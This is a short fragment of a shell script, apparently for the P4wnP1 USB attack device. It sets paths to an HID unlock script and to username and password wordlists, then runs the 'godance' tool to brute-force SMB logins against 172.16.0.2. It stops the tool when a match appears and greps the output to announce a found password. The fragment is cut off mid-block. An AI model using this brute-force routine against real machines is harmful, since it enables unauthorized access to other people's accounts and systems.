...
unlock_hid_script="/usr/local/P4wnP1/HIDScripts/unlock_hid_script.js"
user_bruteforce_list="/root/user.txt"
pass_bruteforce_list="/usr/share/john/password.lst"
...
cd /root/go/bin
./godance -h 172.16.0.2 -u user.txt -w /usr/share/john/password.lst -d WORKGROUP -t 500 | tee test | { grep -q "Username" <(tail -F /root/go/bin/test | tee /dev/stderr) && killall -9 godance; }
cat test > $password_process_file
if grep -q "voice" $password_process_file; then
echo "[*] Password found!"
